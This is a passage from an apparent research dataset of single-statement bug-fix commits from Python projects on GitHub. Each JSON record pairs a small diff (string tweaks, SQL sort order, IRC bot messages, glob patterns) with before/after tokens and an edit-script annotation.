\"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dial_lens\", \"T\"], 2]]"}
{"project": "cross-lingual_NER", "commit_sha": "3ef3f1907958726d731f26fab1edd7a44d6a882f", "parent_sha": "8fb4ececd75dcc19211938bfa4af9afae78b1eac", "file_path": "pytorch_ncrf.py", "project_url": "https://github.com/thespectrewithin/cross-lingual_NER", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -424,7 +424,7 @@ def main():\n         d_acc, d_p, d_r, d_f, d_preds = evaluate(dev_X, dev_Y)\n         t_acc, t_p, t_r, t_f, t_preds = evaluate(test_X, test_Y)\n         \n-        print(\"Epoch {} of {} took {:.4f}s, learning rate: {:.6f}, training loss: {:.4f}, training accuracy: {:.4f}\".format(epoch, num_epoch, time.time() - start_time, lr, total_loss/train_batches, total_correct.float() * 100.0/total_words))\n+        print(\"Epoch {} of {} took {:.4f}s, learning rate: {:.6f}, training loss: {:.4f}, training accuracy: {:.4f}\".format(epoch, num_epoch, time.time() - start_time, lr, total_loss/train_batches, total_correct * 100.0/total_words))\n \n         if d_f > best_dev:\n             best_dev = d_f\n", "before": "print ( \"Epoch {} of {} took {:.4f}s, learning rate: {:.6f}, training loss: {:.4f}, training accuracy: {:.4f}\" . format ( epoch , num_epoch , time . time ( ) - start_time , lr , total_loss / train_batches , total_correct . float ( ) * 100.0 / total_words ) )", "after": "print ( \"Epoch {} of {} took {:.4f}s, learning rate: {:.6f}, training loss: {:.4f}, training accuracy: {:.4f}\" . format ( epoch , num_epoch , time . time ( ) - start_time , lr , total_loss / train_batches , total_correct * 100.0 / total_words ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 199, 3, 228], [\"identifier:total_correct\", 3, 199, 3, 212], 0], [\"Delete\", [\".:.\", 3, 212, 3, 213]], [\"Delete\", [\"identifier:float\", 3, 213, 3, 218]], [\"Delete\", [\"attribute\", 3, 199, 3, 218]], [\"Delete\", [\"(:(\", 3, 218, 3, 219]], [\"Delete\", [\"):)\", 3, 219, 3, 220]], [\"Delete\", [\"argument_list\", 3, 218, 3, 220]], [\"Delete\", [\"call\", 3, 199, 3, 220]]]"}
{"project": "bot", "commit_sha": "d415e909ffa607bf238d6312a0ea957107a2be55", "parent_sha": "94389dd24eb389c106f00d277634b62a5cd8a4e5", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -503,7 +503,7 @@ def main():\n                     # Release\n                     sendntc(\"Release: \" + format(platform.release()), adminname)\n                     # Version\n-                    sendntc(\"Version :\" + format(platform.version()), adminname)\n+                    sendntc(\"Version: \" + format(platform.version()), adminname)\n                     # Architecture\n                     sendntc(\"Architecture: \" + format(platform.architecture()[0]), adminname)\n                     # Machine\n", "before": "sendntc ( \"Version :\" + format ( platform . version ( ) ) , adminname )", "after": "sendntc ( \"Version: \" + format ( platform . version ( ) ) , adminname )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Version :\\\"\", 3, 29, 3, 40], \"\\\"Version: \\\"\"]]"}
{"project": "bot", "commit_sha": "1ec5962e8b9af3a07f7107aabd01d9b3ffc42e42", "parent_sha": "cd3dc2ddd722d95f37137dde0a638496dec1735f", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -167,7 +167,7 @@ def sendntc(ntc, target=channel): # Sends a NOTICE to the target.\n     ircsend(\"NOTICE \"+ target +\" :\"+ ntc)\n     \n def sendversion(nick, ver): # Respond to VERSION request.\n-    ver = \" :VERSION \" + software + ' ' + version + ' Download it at: ' + github\n+    ver = \"VERSION \" + software + ' ' + version + ' Download it at: ' + github\n     sendntc(ver, nick)\n     #ircsend(\"NOTICE \"+ nick +\" :VERSION \" + ver)\n     \n", "before": "ver = \" :VERSION \" + software + ' ' + version + ' Download it at: ' + github", "after": "ver = \"VERSION \" + software + ' ' + version + ' Download it at: ' + github", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\" :VERSION \\\"\", 3, 11, 3, 23], \"\\\"VERSION \\\"\"]]"}
{"project": "bot", "commit_sha": "adb4531d69f000c237bfb29917214cbfbbb5718f", "parent_sha": "930dbf47ca5da823b49096c2fc188a91e08dde26", "file_path": "hackserv.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -426,7 +426,7 @@ def main(): # This is the main function for all of the bot controls.\n             if len(name) < 17:\n                 if message.find(channel) != -1:\n                     if onJoin:\n-                        ircsend(\"DNS\"+ name) # Attempt to get users IP address from host name.\n+                        ircsend(\"DNS \"+ name) # Attempt to get users IP address from host name.\n                         sendntc('User: '+ name +' Host: '+ ipHost +' Joined: '+ message, adminname)\n             \n         # Messages come in from IRC in the format of: \":[Nick]!~[hostname]@[IPAddress]PRIVMSG[channel]:[message]\"\n", "before": "ircsend ( \"DNS\" + name )", "after": "ircsend ( \"DNS \" + name )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"DNS\\\"\", 3, 33, 3, 38], \"\\\"DNS \\\"\"]]"}
{"project": "bot", "commit_sha": "e15f8f9009dbc9a24fba9668dd5e2745bf3ee89c", "parent_sha": "7a0a49a18aa29f39aa8c1ec8a3f154864aeec995", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ def newnick(newnick): # Change botnick.\n \n def sendversion(nick, ver): # Respond to VERSION request.\n     ver = software + ' ' + version + ' Download it at: ' + github\n-    ircsock.send(bytes(\"VERSION \"+ nick +\" :VERSION \" + ver +\"\\n\", \"UTF-8\"))\n+    ircsock.send(bytes(\"NOTICE \"+ nick +\" :VERSION \" + ver +\"\\n\", \"UTF-8\"))\n     \n def sendmsg(msg, target=channel): # Sends messages to the target.\n     ircsock.send(bytes(\"PRIVMSG \"+ target +\" :\"+ msg +\"\\n\", \"UTF-8\"))\n", "before": "ircsock . send ( bytes ( \"VERSION \" + nick + \" :VERSION \" + ver + \"\\n\" , \"UTF-8\" ) )", "after": "ircsock . send ( bytes ( \"NOTICE \" + nick + \" :VERSION \" + ver + \"\\n\" , \"UTF-8\" ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"VERSION \\\"\", 3, 24, 3, 34], \"\\\"NOTICE \\\"\"]]"}
{"project": "sparsebak", "commit_sha": "ff81c70943c0cf690c03b5b2c18e14a00823df4b", "parent_sha": "884da86872831fd228bf54a9a24f4572fae99b36", "file_path": "sparsebak.py", "project_url": "https://github.com/tasket/sparsebak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -434,7 +434,7 @@ def record_to_vm(send_all = False):\n             print(\"format =\", \"tar\" if options.tarfile else \"folders\", file=f)\n             print(\"previous =\", \"none\" if send_all else sessions[-1], file=f)\n         tarf.add(sdir+\"-tmp/info\")\n-        tarf.add(sdir+\"-tmp/hashes\")\n+        tarf.add(sdir+\"-tmp/manifest\")\n \n         #print(\"Ending tar process \", end=\"\")\n         tarf.close()\n", "before": "tarf . add ( sdir + \"-tmp/hashes\" )", "after": "tarf . add ( sdir + \"-tmp/manifest\" )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"-tmp/hashes\\\"\", 3, 23, 3, 36], \"\\\"-tmp/manifest\\\"\"]]"}
{"project": "gitcher", "commit_sha": "0bb55d2f9aaecc51ed8d5386acda8cc76eab2c08", "parent_sha": "5ac3edb4f9b8a96b88ea2cdac7beee0083d6f897", "file_path": "gitcher/__main__.py", "project_url": "https://github.com/glezseoane/gitcher", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -440,7 +440,7 @@ def interactive_main() -> None:\n \n     opt = listen(\"Option: \")\n     while not check_opt(opt):\n-        print(MSG_ERROR + \" Invalid opt! Use s|g|a|d. Type exit to quit.\")\n+        print(MSG_ERROR + \" Invalid opt! Use s|g|a|u|m|d. Type exit to quit.\")\n         opt = listen(\"Enter option: \")\n \n     if not opt == 'a' and not opt == 'u':\n", "before": "print ( MSG_ERROR + \" Invalid opt! Use s|g|a|d. Type exit to quit.\" )", "after": "print ( MSG_ERROR + \" Invalid opt! Use s|g|a|u|m|d. Type exit to quit.\" )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\" Invalid opt! Use s|g|a|d. Type exit to quit.\\\"\", 3, 27, 3, 74], \"\\\" Invalid opt! Use s|g|a|u|m|d. Type exit to quit.\\\"\"]]"}
{"project": "gitcher", "commit_sha": "f7f1bc5060ad1fd4678eb4d14fc108752e2fab5d", "parent_sha": "25817f97cedba72a86b2365ca589ff6923eee0cf", "file_path": "gitcher/__main__.py", "project_url": "https://github.com/glezseoane/gitcher", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -511,7 +511,7 @@ def interactive_main() -> None:\n     print(COLOR_BRI_CYAN + \"m\" + COLOR_RST + \"    mirror a profile to create a\"\n                                              \" duplicate.\")\n     print(COLOR_BRI_CYAN + \"d\" + COLOR_RST + \"    delete a profile.\")\n-    print(\"\\nInput \" + COLOR_BRI_CYAN + \"quit\" + COLOR_RST + \"or\" +\n+    print(\"\\nInput \" + COLOR_BRI_CYAN + \"quit\" + COLOR_RST + \" or \" +\n           COLOR_BRI_CYAN + \"exit\" + COLOR_RST + \"everywhere to quit.\\n\")\n \n     opt = listen(\"Option: \", dictionary.get_union_cmds_set())\n", "before": "print ( \"\\nInput \" + COLOR_BRI_CYAN + \"quit\" + COLOR_RST + \"or\" + COLOR_BRI_CYAN + \"exit\" + COLOR_RST + \"everywhere to quit.\\n\" )", "after": "print ( \"\\nInput \" + COLOR_BRI_CYAN + \"quit\" + COLOR_RST + \" or \" + COLOR_BRI_CYAN + \"exit\" + COLOR_RST + \"everywhere to quit.\\n\" )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"or\\\"\", 3, 62, 3, 66], \"\\\" or \\\"\"]]"}
{"project": "serverless-application", "commit_sha": "3e6773938f2078c0d21ac86df886b324eec225b8", "parent_sha": "227be8686e94a0b9bebc3b71901cf668e8c20e89", "file_path": "tests/common/test_yahoo_utile.py", "project_url": "https://github.com/AlisProject/serverless-application", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class TestYahooUtil(TestCase):\n             self.assertEqual(\n                 url,\n                 'https://auth.login.yahoo.co.jp/yconnect/v2/authorization?response_type=code&client_id=' +\n-                'fake_client_id&scope=openid%20email%20profile&redirect_uri=http://callback&nonce=xxxx&state=xxxx')\n+                'fake_client_id&scope=openid%20email&redirect_uri=http://callback&nonce=xxxx&state=xxxx')\n \n     def test_get_authorization_url_ng_with_clienterror(self):\n         with self.assertRaises(ClientError):\n", "before": "self . assertEqual ( url , 'https://auth.login.yahoo.co.jp/yconnect/v2/authorization?response_type=code&client_id=' + 'fake_client_id&scope=openid%20email%20profile&redirect_uri=http://callback&nonce=xxxx&state=xxxx' )", "after": "self . assertEqual ( url , 'https://auth.login.yahoo.co.jp/yconnect/v2/authorization?response_type=code&client_id=' + 'fake_client_id&scope=openid%20email&redirect_uri=http://callback&nonce=xxxx&state=xxxx' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'fake_client_id&scope=openid%20email%20profile&redirect_uri=http://callback&nonce=xxxx&state=xxxx'\", 3, 17, 3, 115], \"'fake_client_id&scope=openid%20email&redirect_uri=http://callback&nonce=xxxx&state=xxxx'\"]]"}
{"project": "spotify-skill", "commit_sha": "00991e52038deb12bebeca052637e489be3d68e7", "parent_sha": "29ce6f0c546657b6a9dd1fad8f9065e47ed8c076", "file_path": "__init__.py", "project_url": "https://github.com/forslund/spotify-skill", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -368,7 +368,7 @@ class SpotifySkill(MycroftSkill):\n         if self.spotify.is_playing() and \\\n-                self.settings.get('use_ducking', 'false') == 'true':\n+                self.settings.get('use_ducking', False):\n             self.__pause()\n             self.ducking = True\n \n", "before": "if self . spotify . is_playing ( ) and self . settings . get ( 'use_ducking' , 'false' ) == 'true' : self . __pause ( ) self . ducking = True", "after": "if self . spotify . is_playing ( ) and self . settings . get ( 'use_ducking' , False ) : self . __pause ( ) self . ducking = True", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"boolean_operator\", 0, 12, 1, 68], [\"call\", 1, 17, 1, 58], 2], [\"Insert\", [\"argument_list\", 1, 34, 1, 58], [\"false:False\", \"T\"], 3], [\"Delete\", [\"string:'false'\", 1, 50, 1, 57]], [\"Delete\", [\"==:==\", 1, 59, 1, 61]], [\"Delete\", [\"string:'true'\", 1, 62, 1, 68]], [\"Delete\", [\"comparison_operator\", 1, 17, 1, 68]]]"}
{"project": "strax", "commit_sha": "86e9fa886c09dea306c40912778a5b5ba5a54962", "parent_sha": "70f803cee10cdbfbcccc4cc3f7791928f0d978c3", "file_path": "strax/xenon/pax_interface.py", "project_url": "https://github.com/AxFoundation/strax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ class RecordsFromPax(strax.Plugin):\n         if not os.path.exists(self.config['pax_raw_dir']):\n             raise FileNotFoundError(self.config['pax_raw_dir'])\n         input_dir = os.path.join(self.config['pax_raw_dir'], self.run_id)\n-        pax_files = sorted(glob.glob(input_dir + '/*.zip'))\n+        pax_files = sorted(glob.glob(input_dir + '/XENON*.zip'))\n         pax_sizes = np.array([os.path.getsize(x)\n                               for x in pax_files])\n         print(f\"Found {len(pax_files)} files, {pax_sizes.sum() / 1e9:.2f} GB\")\n", "before": "pax_files = sorted ( glob . glob ( input_dir + '/*.zip' ) )", "after": "pax_files = sorted ( glob . glob ( input_dir + '/XENON*.zip' ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'/*.zip'\", 3, 50, 3, 58], \"'/XENON*.zip'\"]]"}
{"project": "nyt-fec", "commit_sha": "a1d3be9f522506b91b22480352263d6dfca2f5e1", "parent_sha": "f102b0ad55e5cc481b3b58ff7edc5a7bf911ba14", "file_path": "cycle_2020/utils/loader.py", "project_url": "https://github.com/newsdev/nyt-fec", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -166,7 +166,7 @@ def check_coverage_dates(filing, coverage_end):\n     #remove filings whose coverage period ended outside the current cycle\n     if coverage_end:\n         coverage_end_year = coverage_end[0:4]\n-        if filing['form_type'] == 'F3P' and CYCLE % 4 == 0:\n+        if filing['form_type'] in ['F3PN', 'F3PA'] and CYCLE % 4 == 0:\n             #if it's a presidential filing, we want it if it's in the 4-year period.\n             acceptable_years = [CYCLE, CYCLE-1, CYCLE-3, CYCLE-4]\n         else:\n", "before": "if filing [ 'form_type' ] == 'F3P' and CYCLE % 4 == 0 : acceptable_years = [ CYCLE , CYCLE - 1 , CYCLE - 3 , CYCLE - 4 ] else : ", "after": "if filing [ 'form_type' ] in [ 'F3PN' , 'F3PA' ] and CYCLE % 4 == 0 : acceptable_years = [ CYCLE , CYCLE - 1 , CYCLE - 3 , CYCLE - 4 ] else : ", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 40], [\"in:in\", \"T\"], 1], [\"Insert\", [\"comparison_operator\", 3, 12, 3, 40], [\"list\", \"N0\"], 2], [\"Insert\", \"N0\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:'F3PN'\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'F3PA'\", \"T\"], 3], [\"Insert\", \"N0\", [\"]:]\", \"T\"], 4], [\"Delete\", [\"==:==\", 3, 32, 3, 34]], [\"Delete\", [\"string:'F3P'\", 3, 35, 3, 40]]]"}
{"project": "strax", "commit_sha": "2e350fcb0fe1d663c53dbf32346985143b26619d", "parent_sha": "94f20b4e30fa0ec99e7210887eabbfcb82b5e331", "file_path": "strax/processing/peak_building.py", "project_url": "https://github.com/AxFoundation/strax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -132,7 +132,7 @@ def sum_waveform(peaks, records, adc_to_pe, n_channels=248):\n         for left_r_i in range(left_r_i, len(records)):\n             r = records[left_r_i]\n             # TODO: need test that fails if we replace < with <= here\n-            if p['time'] < r['time'] + r['length']:\n+            if p['time'] < r['time'] + r['length'] * dt:\n                 break\n         else:\n             # Records exhausted before peaks exhausted\n", "before": "if p [ 'time' ] < r [ 'time' ] + r [ 'length' ] : break", "after": "if p [ 'time' ] < r [ 'time' ] + r [ 'length' ] * dt : break", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 28, 3, 51], [\"binary_operator\", \"N0\"], 2], [\"Move\", \"N0\", [\"subscript\", 3, 40, 3, 51], 0], [\"Insert\", \"N0\", [\"*:*\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:dt\", \"T\"], 2]]"}
{"project": "cb4", "commit_sha": "06336ebb3421362c44bc7f4d44494d52fe72d193", "parent_sha": "6ac2cbbce0a3006811e61e8ceb3275a1f7eabf56", "file_path": "vj4/template.py", "project_url": "https://github.com/joint-online-judge/cb4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ def gravatar_url(gravatar, size=200):\n     gravatar_hash = hashlib.md5(gravatar.lower().encode()).hexdigest()\n   else:\n     gravatar_hash = ''\n-  return ('//gravatar.proxy.ustclug.org/avatar/' + gravatar_hash + \"?\" +\n+  return ('//cn.gravatar.com/avatar/' + gravatar_hash + \"?\" +\n           parse.urlencode({'d': 'mm', 's': str(size)}))\n \n \n", "before": "return ( '//gravatar.proxy.ustclug.org/avatar/' + gravatar_hash + \"?\" + parse . urlencode ( { 'd' : 'mm' , 's' : str ( size ) } ) )", "after": "return ( '//cn.gravatar.com/avatar/' + gravatar_hash + \"?\" + parse . urlencode ( { 'd' : 'mm' , 's' : str ( size ) } ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'//gravatar.proxy.ustclug.org/avatar/'\", 3, 11, 3, 49], \"'//cn.gravatar.com/avatar/'\"]]"}
{"project": "python-grader", "commit_sha": "2983bec87e679b442c67cd8899169c61fb1b0a5e", "parent_sha": "f972f7a74e085062fdfd4cc3e16d0bcc76222359", "file_path": "grader/wrappers.py", "project_url": "https://github.com/kspar/python-grader", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ def test_cases(test_args, description=None, **arg_functions):\n \n     if description is None:\n-        description = \", \".join(str(i)+\"=[\"+key+\"]\" for i, value in enumerate(test_args))\n+        description = \", \".join(str(i)+\"=[\"+value+\"]\" for i, value in enumerate(test_args))\n \n     def calc_function_kwargs(values):\n         out = {}\n", "before": "description = \", \" . join ( str ( i ) + \"=[\" + key + \"]\" for i , value in enumerate ( test_args ) )", "after": "description = \", \" . join ( str ( i ) + \"=[\" + value + \"]\" for i , value in enumerate ( test_args ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:key\", 2, 45, 2, 48], \"value\"]]"}
{"project": "wger_stark", "commit_sha": "a1604ba7a1d7df72eae9ddf2fec9e60c7ab6a70a", "parent_sha": "6231afb37e1a829bf88e1090bd0c0958f721cf75", "file_path": "wger/nutrition/forms.py", "project_url": "https://github.com/andela/wger_stark", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class UnitChooserForm(forms.Form):\n     def __init__(self, *args, **kwargs):\n         super(UnitChooserForm, self).__init__(*args, **kwargs)\n \n-        if len(args) and args[0]['ingredient']:\n+        if len(args) and args[0].get('ingredient'):\n             ingredient_id = args[0]['ingredient']\n \n         elif kwargs.get('data'):\n", "before": "if len ( args ) and args [ 0 ] [ 'ingredient' ] : ingredient_id = args [ 0 ] [ 'ingredient' ] elif kwargs . get ( 'data' ) : ", "after": "if len ( args ) and args [ 0 ] . get ( 'ingredient' ) : ingredient_id = args [ 0 ] [ 'ingredient' ] elif kwargs . get ( 'data' ) : ", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 47], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 26, 3, 33], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"string:'ingredient'\", 3, 34, 3, 46], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Delete\", [\"[:[\", 3, 33, 3, 34]], [\"Delete\", [\"]:]\", 3, 46, 3, 47]], [\"Delete\", [\"subscript\", 3, 26, 3, 47]]]"}
{"project": "horizon", "commit_sha": "5805aa066aa2f3dd72dacc5cc692f6b205c8f3c5", "parent_sha": "02f5b4057187979fe8e908403dda23b9d0e797ca", "file_path": "openstack_dashboard/dashboards/project/instances/workflows/create_instance.py", "project_url": "https://github.com/mkowalski/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -435,7 +435,7 @@ class SetInstanceDetailsAction(workflows.Action):\n                                                   context.get('project_id'),\n                                                   self._images_cache)\n         for image in images:\n-            image.bytes = image.virtual_size or image.size\n+            image.bytes = getattr(image, 'virtual_size', None) or image.size\n             image.volume_size = max(\n                 image.min_disk, functions.bytes_to_gigabytes(image.bytes))\n             choices.append((image.id, image))\n", "before": "image . bytes = image . virtual_size or image . size", "after": "image . bytes = getattr ( image , 'virtual_size' , None ) or image . size", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 27, 3, 59], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:getattr\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:image\", 3, 27, 3, 32], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'virtual_size'\", \"T\"], 3], [\"Insert\", \"N1\", [\",:,\", \"T\"], 4], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 5], [\"Insert\", \"N1\", [\"):)\", \"T\"], 6], [\"Delete\", [\".:.\", 3, 32, 3, 33]], [\"Delete\", [\"identifier:virtual_size\", 3, 33, 3, 45]], [\"Delete\", [\"attribute\", 3, 27, 3, 45]]]"}
{"project": "dotfiles", "commit_sha": "4d28a01a6934789c99f4457b25c7a335770d41fc", "parent_sha": "597c3495ef4d66f1ed410447abf56ffaeb700880", "file_path": ".weechat/python/autoload/notify_send.py", "project_url": "https://github.com/c-rap/dotfiles", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,4 +60,4 @@ def show_notification(chan,message):\n     safe_chan = pattern.sub('', chan)\n     safe_msg =  pattern.sub('', message)\n \n-    os.system('notify-send -u %(urgency)s -i %(icon)s \"%(safe_chan)s\" \"%(safe_msg)s\" &' % locals())\n+    os.system('notify-send --hint=int:transient:1 -u %(urgency)s -i %(icon)s \"%(safe_chan)s\" \"%(safe_msg)s\" &' % locals())\n", "before": "os . system ( 'notify-send -u %(urgency)s -i %(icon)s \"%(safe_chan)s\" \"%(safe_msg)s\" &' % locals ( ) )", "after": "os . system ( 'notify-send --hint=int:transient:1 -u %(urgency)s -i %(icon)s \"%(safe_chan)s\" \"%(safe_msg)s\" &' % locals ( ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'notify-send -u %(urgency)s -i %(icon)s \\\"%(safe_chan)s\\\" \\\"%(safe_msg)s\\\" &'\", 3, 15, 3, 88], \"'notify-send --hint=int:transient:1 -u %(urgency)s -i %(icon)s \\\"%(safe_chan)s\\\" \\\"%(safe_msg)s\\\" &'\"]]"}
{"project": "GhostPyramid", "commit_sha": "868fd55d8c362ab30d7fc76b4ce696b2abad4041", "parent_sha": "0889c92a3e4c54ff2cf4b0c480d6b89343b2b4c3", "file_path": "charades/charades/strings.py", "project_url": "https://github.com/ElliotAOram/GhostPyramid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ def actor_instructions():\n \n def viewer_instructions():\n     return \"After the Actor has selected a phrase, you will have a limited time to guess it.\" +\\\n-           \" Look at the hologram infront of you to see what the actor is doing.\" +\\\n+           \" Look at the hologram in front of you to see what the actor is doing.\" +\\\n            \" The faster you guess the phrase the more points you get.\" +\\\n            \" You will be given some information about the current word or phrase to help you guess.\"\n \n", "before": "return \"After the Actor has selected a phrase, you will have a limited time to guess it.\" + \" Look at the hologram infront of you to see what the actor is doing.\" + \" The faster you guess the phrase the more points you get.\" + \" You will be given some information about the current word or phrase to help you guess.\"", "after": "return \"After the Actor has selected a phrase, you will have a limited time to guess it.\" + \" Look at the hologram in front of you to see what the actor is doing.\" + \" The faster you guess the phrase the more points you get.\" + \" You will be given some information about the current word or phrase to help you guess.\"", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\" Look at the hologram infront of you to see what the actor is doing.\\\"\", 3, 12, 3, 82], \"\\\" Look at the hologram in front of you to see what the actor is doing.\\\"\"]]"}
{"project": "GMhil", "commit_sha": "423dba276121d32df1c29dba3d524efe2048d3f4", "parent_sha": "fb784955dd5e912a7b064789981a521f7bbbf3f5", "file_path": "haas/headnode.py", "project_url": "https://github.com/gfaline/GMhil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class HeadNode(object):\n         cmd(['virsh', 'undefine', self.name, '--remove-all-storage'])\n         for nic in self.nics:\n             nic = str(nic)\n-            bridge = 'br-vlan%d' % nic\n+            bridge = 'br-vlan%s' % nic\n             vlan_nic = '%s.%d' % (config.trunk_nic, nic)\n             cmd(['brctl', 'delif', bridge, vlan_nic])\n             cmd(['vconfig', 'rem', vlan_nic])\n", "before": "bridge = 'br-vlan%d' % nic", "after": "bridge = 'br-vlan%s' % nic", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'br-vlan%d'\", 3, 22, 3, 33], \"'br-vlan%s'\"]]"}
{"project": "GMhil", "commit_sha": "4c5c026545b0a7242ebefe3b371efdac05ac85f5", "parent_sha": "ed29ee540a67b020be6e7a8630b6eabba6f49ce9", "file_path": "haas/model.py", "project_url": "https://github.com/gfaline/GMhil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -197,7 +197,7 @@ class Headnode(Model):\n         self.available = available\n \n     def __repr__(self):\n-        return 'Headnode<%r %r %r>'%(self.id,\n+        return 'Headnode<%r %r %r %r>'%(self.id,\n                                      self.available,\n                                      self.label,\n                                      self.project_label if self.project else None)\n", "before": "return 'Headnode<%r %r %r>' % ( self . id , self . available , self . label , self . project_label if self . project else None )", "after": "return 'Headnode<%r %r %r %r>' % ( self . id , self . available , self . label , self . project_label if self . project else None )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'Headnode<%r %r %r>'\", 3, 16, 3, 36], \"'Headnode<%r %r %r %r>'\"]]"}
{"project": "GMhil", "commit_sha": "76081623e4ed55c06d08a31633ab702d843285ba", "parent_sha": "8630da2c95cb3e9b96afc29a8508f962831e4863", "file_path": "haas/api.py", "project_url": "https://github.com/gfaline/GMhil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ def rest_call(method, path):\n         def foo(bar, baz, quux):\n             pass\n \n-    When a POST request to /some-uril/*/* occurs, `foo` will be invoked\n+    When a POST request to /some-url/*/* occurs, `foo` will be invoked\n     with its bar and baz arguments pulleed from the url, and its quux from\n     the form data in the body.\n \n", "before": "request to / some - uril / * / * occurs , `foo` will be invoked", "after": "request to / some - url / * / * occurs , `foo` will be invoked", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:uril\", 3, 34, 3, 38], \"url\"]]"}
{"project": "stock-logistics-workflow", "commit_sha": "63f9bf83787d39f3c8f049340c1892000d33d9e7", "parent_sha": "39a34fcbeb7b8e5f8d3032ad7bba7cecae2f88eb", "file_path": "mrp_prodlot_autosplit/stock.py", "project_url": "https://github.com/nzroof/stock-logistics-workflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class stock_production_lot(osv.osv):\n     def _last_location_id(self, cr, uid, ids, field_name, arg, context={}):\n         res = {}\n         for prodlot_id in ids:\n-            cr.execute(\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned ASC LIMIT 1\" % prodlot_id)\n+            cr.execute(\"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order by stock_move.date_planned DESC LIMIT 1\" % prodlot_id)\n             results = cr.fetchone()\n             if results and len(results) > 0:\n                 res[prodlot_id] = results[0]#TODO return tuple to avoid name_get being requested by the GTK client\n", "before": "cr . execute ( \"select location_dest_id from stock_move where stock_move.prodlot_id = %s and stock_move.state='done' order 